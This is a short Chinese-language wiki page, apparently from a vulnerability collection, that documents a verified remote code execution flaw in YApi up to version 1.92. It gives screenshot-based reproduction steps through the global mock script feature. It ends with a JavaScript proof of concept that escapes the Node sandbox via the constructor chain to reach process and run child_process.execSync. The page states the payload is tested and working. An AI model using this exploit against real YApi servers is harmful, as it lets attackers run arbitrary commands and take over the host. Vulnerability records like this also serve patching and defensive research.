<languages />

<center>
|:-:|:-:|
|![](Check.png "Check.png")|**<translate>該漏洞已通過驗證</translate>**

* * * * *

<small><translate>本頁面的EXP/POC/Payload經測試可用，漏洞已經成功復現。</translate></small>|

</center>
<translate>

影響版本
--------

</translate> \<=V1.92 All

<translate>

漏洞復現
--------

</translate>

<translate>

漏洞復現
--------

</translate> <translate> 登錄註冊後，創建一個項目 </translate>

![](124460388-eaa46100-ddc1-11eb-80c4-2bddb97df8e1.png "124460388-eaa46100-ddc1-11eb-80c4-2bddb97df8e1.png")

<translate> 然後選擇設置全局的mock腳本，設置命令為遠程訪問我的服務器地址。 </translate>

![](124460511-090a5c80-ddc2-11eb-92f6-46c9b3b498bb.png "124460511-090a5c80-ddc2-11eb-92f6-46c9b3b498bb.png")

<translate> 添加接口，訪問接口的mock地址 </translate>

![](124460629-2dfecf80-ddc2-11eb-98c3-b96f7174d8f1.png "124460629-2dfecf80-ddc2-11eb-98c3-b96f7174d8f1.png")

<translate> 服務器可以看到如下響應 </translate> ![](124460757-5686c980-ddc2-11eb-87df-09e0f9ac08af.png "fig:124460757-5686c980-ddc2-11eb-87df-09e0f9ac08af.png")

POC
---

    const sandbox = this
    const ObjectConstructor = this.constructor
    const FunctionConstructor = ObjectConstructor.constructor
    const myfun = FunctionConstructor('return process')
    const process = myfun()
    mockjson = process.mainModule.require("child_process").execSync("command").toString()

<translate>

參考
----

</translate> <https://github.com/YMFE/yapi/issues/2233>